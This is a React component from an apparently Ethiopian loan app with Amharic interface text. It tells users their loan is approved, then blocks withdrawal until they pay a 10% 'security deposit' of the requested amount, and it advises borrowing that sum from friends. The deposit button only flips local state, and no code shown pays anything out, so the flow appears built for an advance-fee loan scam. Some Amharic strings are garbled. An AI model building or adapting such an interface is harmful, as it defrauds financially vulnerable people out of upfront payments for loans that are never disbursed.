import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Status.css';

export default function Status() {
  const navigate = useNavigate();
  
  // Get context data
  const { loanStatusData, personalDetailsData } = useLoanApplication();
  
  // Get phone number from context or localStorage
  const getPhoneNumber = () => {
    if (personalDetailsData?.phoneNumber) {
      return personalDetailsData.phoneNumber;
    }
    try {
      return localStorage.getItem('birr_phone') || '911234567';
    } catch (error) {
      return '911234567';
    }
  };

  const [showDeposit, setShowDeposit] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [showLoanDetails, setShowLoanDetails] = useState(false);
  const [showWithdrawWarning, setShowWithdrawWarning] = useState(false);
  const [hasDeposited, setHasDeposited] = useState(loanStatusData?.hasDeposited || false);

  const phoneNumber = getPhoneNumber();

  // Use actual loan data from context
  const loanData = {
    approvedAmount: loanStatusData?.approvedAmount || 0,
    requestedAmount: loanStatusData?.requestedAmount || 0,
    monthlyPayment: loanStatusData?.monthlyPayment || 0,
    loanTerm: loanStatusData?.loanTerm || '12 ወሮች',
    interestRate: loanStatusData?.interestRate || '8% APR'
  };

  const userData = {
    name: personalDetailsData?.firstName && personalDetailsData?.lastName 
      ? `${personalDetailsData.firstName} ${personalDetailsData.lastName}` 
      : 'የደንበኛ ስም',
    accountNumber: phoneNumber.replace(/\D/g, '').slice(-10) || '9112345678',
    requiredDeposit: loanData.requiredDeposit || (loanData.requestedAmount * 0.1),
    totalWithBonus: loanData.totalWithBonus || (loanData.requestedAmount + (loanData.requestedAmount * 0.1))
  };

  // Sync hasDeposited state with context
  useEffect(() => {
    setHasDeposited(loanStatusData?.hasDeposited || false);
  }, [loanStatusData]);

  const handleDepositFunds = () => {
    setShowDeposit(true);
    setShowWithdraw(false);
    setShowLoanDetails(false);
    setShowWithdrawWarning(false);
  };

  const handleWithdrawFunds = () => {
    if (!hasDeposited) {
      setShowWithdrawWarning(true);
    } else {
      setShowWithdraw(true);
      setShowDeposit(false);
      setShowLoanDetails(false);
    }
  };

  const handleCancelWithdraw = () => {
    setShowWithdrawWarning(false);
  };

  const handleBack = () => {
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowLoanDetails(false);
  };

  const handleLoanDetails = () => {
    setShowLoanDetails(true);
    setShowDeposit(false);
    setShowWithdraw(false);
    setShowWithdrawWarning(false);
  };

  const handleCompleteDeposit = () => {
    setHasDeposited(true);
    setShowDeposit(false);
  };

  const handleCompleteWithdraw = () => {
    setShowWithdraw(false);
  };

  const handleReturnHome = () => {
    navigate('/');
  };

  // Withdraw Warning Modal
  if (showWithdrawWarning) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="popup-overlay" onClick={handleCancelWithdraw}></div>

          <div className="warning-popup">
            <div className="warning-popup-content">
              <div className="warning-icon-container">
                <span className="warning-lock-icon">🔒</span>
              </div>

              <h2 className="warning-popup-title">በመጀመሪያ ይተክሉ!</h2>

              <p className="warning-popup-text">
                ገንዘብ ለመቀበል ከዚህ በፊት የሚጠየቀውን ብድር መጠን 10% መተከል ያስፈልግዎታል።
              </p>

              <div className="warning-popup-buttons">
                <button className="warning-cancel-btn" onClick={handleCancelWithdraw}>
                  ይቅር
                </button>
                <button className="warning-deposit-btn" onClick={handleDepositFunds}>
                  አሁን ተክሉ
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Loan Details Screen
  if (showLoanDetails) {
    return (
      <div className="status-container loan-details-container">
        <div className="status-content loan-details-content">
          
          <div className="loan-details-header">
            <button className="loan-details-back-btn" onClick={handleBack}>
              ←
            </button>
            <h1 className="loan-details-page-title">ብድር ዝርዝር</h1>
          </div>

          <div className="loan-details-modal-card">
            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">👤</span>
                <p className="loan-detail-label-text">ስም</p>
              </div>
              <p className="loan-detail-info-value">{userData.name}</p>
            </div>

            <div className="loan-detail-info-item">
              <div className="loan-detail-info-label">
                <span className="loan-detail-info-icon">📱</span>
                <p className="loan-detail-label-text">ስልክ ቁጥር</p>
              </div>
              <p className="loan-detail-info-value">+251 {userData.accountNumber.slice(1)}</p>
            </div>

            <div className="loan-requested-amount-box">
              <div className="loan-requested-label">
                <span className="loan-detail-info-icon">💵</span>
                <p className="loan-requested-label-text">የሚጠየቀው ብድር መጠን</p>
              </div>
              <p className="loan-requested-value">ብር {loanData.requestedAmount.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">አስፈላጊ ተቀማጥ (10%)</p>
              <p className="loan-summary-value">ብር {userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="loan-deposit-summary-item">
              <p className="loan-summary-label">ጠቅላላ መጠን (10% ቦነስ ጋር)</p>
              <p className="loan-summary-value">ብር {userData.totalWithBonus.toLocaleString()}</p>
            </div>

            <div className="loan-qualified-badge-container">
              <div className="loan-qualified-badge">
                <span>✓</span>
                ሁኔታውን ያሟላ
              </div>
            </div>

            <div className="loan-details-tip-box">
              <div className="loan-details-tip-header">
                <span className="loan-details-tip-icon">💡</span>
                <p className="loan-details-tip-title">ምክር</p>
              </div>
              <p className="loan-details-tip-text">
                ብድር ገንዘብ ለመጠቀም አカውንትዎ ቢያንስ 10% ትክል ሊኖር ይገባል። ካስፈለገ ከጓደኞችዎ ገንዘብ ለመቀበል ይችላሉ፣ ከዚያም ብቁ ካልሆኑ በኋላ ይመልሱት።
              </p>
            </div>

            <button className="loan-details-back-button" onClick={handleBack}>
              <span>←</span>
              ወደ ብድር ማጠቃለያ ተመልሸ
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Deposit Screen
  if (showDeposit) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">ገንዘብ ተክሉ</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">ስም</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">ስልክ ቁጥር</p>
                  <p className="info-value">+251 {userData.accountNumber.slice(1)}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💵 አስፈላጊ ተቀማጥ (10%)</p>
              <p className="deposit-amount">ብር {userData.requiredDeposit.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">መመሪያ:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  ስልክ ገንዘብ መተግበሪያ ይክፈቱ ወይም የስልክ ስልክ ሰሚ ይጠቀሙ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  ስልክ ባንክ አገልግሎትዎን ይድረሱ (ኢትዮ ቴሌኮም፣ ቮዳፎን ወይም ተመሳሳይ)።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  ከ ሜኑ <strong>"ገንዘብ ልክ"</strong> ወይም <strong>"ዝውውር"</strong> ይምረጡ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  ስልክ ቁጥርዎን ያስገቡ: <strong>+251 {userData.accountNumber.slice(1)}</strong>።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  መጠን ያስገቡ: <strong>ብር {userData.requiredDeposit.toLocaleString()}</strong> (ወይም ተጨማሪ)።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  ግብይትን ያረጋግጡ እና ተቀማጥ ጨርስ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">7</span>
                <p className="step-text">
                  ከአገልግሎት አቅራቢዎ ለ SMS ምልክት ይጠብቁ።
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">ጠቃሚ ምክር</span>
              </div>
              <p className="tip-text">
                ብር 10% ቢያንስ ከሌለዎ ከጓደኞችዎ ገንዘብ ለመቀበል ይችላሉ፣ ከዚያም ብቁ ካልሆኑ በኋላ ይመልሱት።
              </p>
            </div>

            <div className="confirmation-box">
              <span className="check-icon">✓</span>
              <p className="confirmation-text">
                <strong>አንዴ ተቀማጥ ሲረጋገጥ</strong>, ብድር ገንዘብ ለመጠቀም ይችላሉ።
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteDeposit}>
              <span className="button-check">✓</span>
              ተቀማጥ ጨርሻለሁ
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Withdraw Screen
  if (showWithdraw) {
    return (
      <div className="status-container">
        <div className="status-content">
          <div className="deposit-header">
            <button className="back-arrow" onClick={handleBack}>←</button>
            <h1 className="deposit-title">ገንዘብ ይወሰዱ</h1>
          </div>

          <div className="deposit-card">
            <div className="info-section">
              <div className="info-item">
                <span className="info-icon">👤</span>
                <div>
                  <p className="info-label">ስም</p>
                  <p className="info-value">{userData.name}</p>
                </div>
              </div>

              <div className="info-item">
                <span className="info-icon">📱</span>
                <div>
                  <p className="info-label">ስልክ ቁጥር</p>
                  <p className="info-value">+251 {userData.accountNumber.slice(1)}</p>
                </div>
              </div>
            </div>

            <div className="required-deposit-box">
              <p className="deposit-label">💰 ክፍት ሚዛን</p>
              <p className="deposit-amount">ብር {loanData.approvedAmount.toLocaleString()}</p>
            </div>

            <div className="instructions-section">
              <h3 className="instructions-title">መመሪያ:</h3>

              <div className="instruction-step">
                <span className="step-number">1</span>
                <p className="step-text">
                  ስልክ ገንዘብ መተግበሪያ ይክፈቱ ወይም የስልክ ስልክ ሰሚ ይጠቀሙ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">2</span>
                <p className="step-text">
                  ስልክ ባንክ አገልግሎትዎን ይድረሱ (ኢትዮ ቴሌኮም፣ ቮዳፎን ወይም ተመሳሳይ)።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">3</span>
                <p className="step-text">
                  ከ ሜኑ <strong>"ገንዘብ ይወሰዱ"</strong> ወይም <strong>"ብር አወጣ"</strong> ይምረጡ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">4</span>
                <p className="step-text">
                  ስልክ ቁጥርዎን ያስገቡ: <strong>+251 {userData.accountNumber.slice(1)}</strong>።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">5</span>
                <p className="step-text">
                  ለመውሰድ የሚፈልጉትን መጠን ያስገቡ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">6</span>
                <p className="step-text">
                  ግብይትን ያረጋግጡ እና ይወሰዱ ጨርስ።
                </p>
              </div>

              <div className="instruction-step">
                <span className="step-number">7</span>
                <p className="step-text">
                  ከአገልግሎት አቅራቢዎ ለ SMS ምልክት ይጠብቁ።
                </p>
              </div>
            </div>

            <div className="tip-box">
              <div className="tip-header">
                <span className="tip-icon">💡</span>
                <span className="tip-title">ጠቃሚ ምክር</span>
              </div>
              <p className="tip-text">
                በ ኢትዮጵያ ውስጥ በማንኛውም ስልክ ገንዘብ ወኪል ወይም ተጋዳይ ቦታ ገንዘብ ሊወስዱ ይችላሉ። መደበኛ ግብይት ስራ ወጪ ይፈጸማል።
              </p>
            </div>

            <button className="complete-button" onClick={handleCompleteWithdraw}>
              <span className="button-check">✓</span>
              ገንዘብ ወሰድኩ
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Main Status Screen
  return (
    <div className="status-container">
      <div className="status-content">
        
        <div className="success-card">
          <div className="success-icon-container">
            <span className="success-checkmark">✓</span>
          </div>

          <h1 className="congrats-title">
            <span className="party-emoji">🎉</span>
            አንደምታደርጋቸው!
          </h1>

          <p className="approval-text">
            ብድርዎ <span className="approval-highlight">ብቅያት ተሰጥቶ!</span> ገንዘብ በቅርቡ ይለቅ።
          </p>

          <div className="approved-amount-section">
            <p className="approved-label">ብቅያት ይሰጥ መጠን</p>
            <p className="approved-amount">ብር {loanData.approvedAmount.toLocaleString()}</p>
          </div>

          <div className="compliance-notice">
            <div className="notice-header">
              <span className="warning-icon">⚠️</span>
              <span className="notice-title">ማክበር ማስታወቂያ</span>
            </div>
            <p className="notice-text">
              አካውንትዎ ንቁ መሆን እና ቢያንስ{' '}
              <span className="notice-highlight">ከሚጠየቀው ብድር መጠን 10%</span> የአደጋ ተቀማጥ መጠበቅ ያስፈልጋል። ይህ ተቀማጥ ብድር በተሳካ ሁኔታ ከተመለሰ በኋላ ሙሉ በሙሉ ይመለሳል እና የተሻለ ወለድ ዋጋ ለማጠናቀር ይረዳል።
            </p>
          </div>
        </div>

        <div className="loan-details-card">
          <div className="details-header">
            <span className="details-icon">💳</span>
            <h2 className="details-title">ብድር ዝርዝር</h2>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">💵</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">ወርሃዊ ክፍያ</p>
              <p className="detail-value">ብር {loanData.monthlyPayment.toLocaleString()}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📅</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">ብድር ጊዜ</p>
              <p className="detail-value">{loanData.loanTerm}</p>
            </div>
          </div>

          <div className="detail-item">
            <div className="detail-icon-wrapper">
              <span className="detail-icon">📈</span>
            </div>
            <div className="detail-content">
              <p className="detail-label">ወለድ ተመን</p>
              <p className="detail-value">{loanData.interestRate}</p>
            </div>
          </div>
        </div>

        <div className="quick-actions-section">
          <h3 className="actions-title">ፈጣን ተግባራት</h3>
          
          <div className="action-buttons">
            <button className="action-button" onClick={handleDepositFunds}>
              <span className="button-icon">💰</span>
              <span>ገንዘብ ተክሉ</span>
            </button>

            <button className="action-button" onClick={handleWithdrawFunds}>
              <span className="button-icon">💸</span>
              <span>ገንዘብ ይወሰዱ</span>
            </button>

            <button className="action-button" onClick={handleLoanDetails}>
              <span className="button-icon">📄</span>
              <span>ብድር ዝርዝር</span>
            </button>
          </div>

          <div className="next-steps-box">
            <div className="next-steps-header">
              <span className="steps-icon">📱</span>
              <span className="steps-title">ቀጣይ ደረጃዎች:</span>
            </div>
            <p className="steps-text">
              በ 24 ሰዓት ውስጥ ስለ ገንዘብ መጠናታው ዝርዝር የ SMS እና ኢሜይል ሊደርስዎ ይችላል።
            </p>
          </div>
        </div>

        <button className="return-home-button" onClick={handleReturnHome}>
          <span className="home-icon">🏠</span>
          <span>ወደ ቤት ተመልሸ</span>
        </button>
      </div>
    </div>
  );
}
